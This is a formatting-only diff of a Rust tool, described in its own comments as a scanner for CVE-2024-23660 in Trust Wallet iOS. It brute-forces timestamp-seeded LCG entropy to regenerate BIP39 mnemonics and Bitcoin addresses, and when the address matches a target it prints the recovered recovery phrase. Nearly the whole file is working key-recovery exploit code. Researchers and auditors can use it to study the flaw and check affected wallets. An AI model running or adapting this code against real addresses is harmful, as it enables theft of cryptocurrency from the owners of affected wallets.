@@ -1,10 +1,10 @@
 use anyhow::Result;
-use tracing::{info, warn};
 use bip39::Mnemonic;
-use bitcoin::secp256k1::Secp256k1;
 use bitcoin::bip32::{DerivationPath, Xpriv};
+use bitcoin::secp256k1::Secp256k1;
 use bitcoin::{Address, Network};
 use std::str::FromStr;
+use tracing::{info, warn};
 
 /// Trust Wallet iOS Vulnerability Scanner (CVE-2024-23660)
 /// Uses std::minstd_rand0 (LCG) seeded with timestamp
@@ -16,23 +16,26 @@ pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
 
     let secp = Secp256k1::new();
     let network = Network::Bitcoin; // Trust Wallet defaults to Bitcoin for BTC
-    
+
     // Parse target to check type
     if let Ok(addr) = Address::from_str(target) {
         if !addr.is_valid_for_network(network) {
-            warn!("Warning: Target address network mismatch (expected {:?})", network);
+            warn!(
+                "Warning: Target address network mismatch (expected {:?})",
+                network
+            );
         }
     } else {
         warn!("Warning: Could not parse target address, assuming string match.");
     }
-    
+
     let mut checked = 0u64;
     let _start_time = std::time::Instant::now();
 
     for t in start_ts..=end_ts {
         // Seed LCG with timestamp
         let mut rng = MinstdRand0::new(t);
-        
+
         // Generate 128 bits (16 bytes) of entropy
         // std::generate usually calls rng() multiple times.
         // For 32-bit LCG, we likely need 4 calls to get 128 bits.
@@ -42,15 +45,15 @@ pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
         // std::minstd_rand0 range is [1, 2147483646].
         // If we simply concatenate, we lose 1 bit per word entropy.
         // Assuming standard C++ std::independent_bits_engine or similar was NOT used,
-        // but rather just filling a buffer. 
+        // but rather just filling a buffer.
         // We act like `uint32_t entropy[4]; for(i=0..4) entropy[i] = rng();`
-        
+
         let mut entropy = [0u8; 16];
         for i in 0..4 {
             let val = rng.next_u32(); // Returns 0..2^31-1
-            // Endianness? Trust Wallet is often LE or Host Endian (likely LE on iOS/ARM).
-            // Let's try Little Endian.
-            entropy[i*4..i*4+4].copy_from_slice(&val.to_le_bytes()); 
+                                      // Endianness? Trust Wallet is often LE or Host Endian (likely LE on iOS/ARM).
+                                      // Let's try Little Endian.
+            entropy[i * 4..i * 4 + 4].copy_from_slice(&val.to_le_bytes());
         }
 
         if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
@@ -62,26 +65,29 @@ pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
                     if let Ok(child) = root.derive_priv(&secp, &path) {
                         let pubkey = child.to_keypair(&secp).public_key();
                         let address = Address::p2pkh(bitcoin::PublicKey::new(pubkey), network);
-                        
+
                         if address.to_string() == target {
-                             warn!("\n🎯 FOUND MATCH!");
-                             warn!("Timestamp: {}", t);
-                             warn!("Mnemonic: {}", mnemonic);
-                             warn!("Address: {}", address);
-                             return Ok(());
+                            warn!("\n🎯 FOUND MATCH!");
+                            warn!("Timestamp: {}", t);
+                            warn!("Mnemonic: {}", mnemonic);
+                            warn!("Address: {}", address);
+                            return Ok(());
                         }
                     }
                 }
             }
         }
-        
+
         checked += 1;
         if checked.is_multiple_of(500_000) {
             info!("Scanned {} timestamps...", checked);
         }
     }
 
-    info!("Scan complete (checked {} timestamps). No match found.", checked);
+    info!(
+        "Scan complete (checked {} timestamps). No match found.",
+        checked
+    );
     Ok(())
 }
 
@@ -95,7 +101,9 @@ struct MinstdRand0 {
 impl MinstdRand0 {
     fn new(seed: u32) -> Self {
         let mut s = seed;
-        if s == 0 { s = 1; } // Seed 0 becomes 1
+        if s == 0 {
+            s = 1;
+        } // Seed 0 becomes 1
         Self { state: s }
     }
 
@@ -103,10 +111,10 @@ impl MinstdRand0 {
         // Use u64 to prevent overflow during multiplication
         const A: u64 = 16807;
         const M: u64 = 2147483647;
-        
+
         let product = (self.state as u64) * A;
         self.state = (product % M) as u32;
-        
+
         self.state
     }
 }
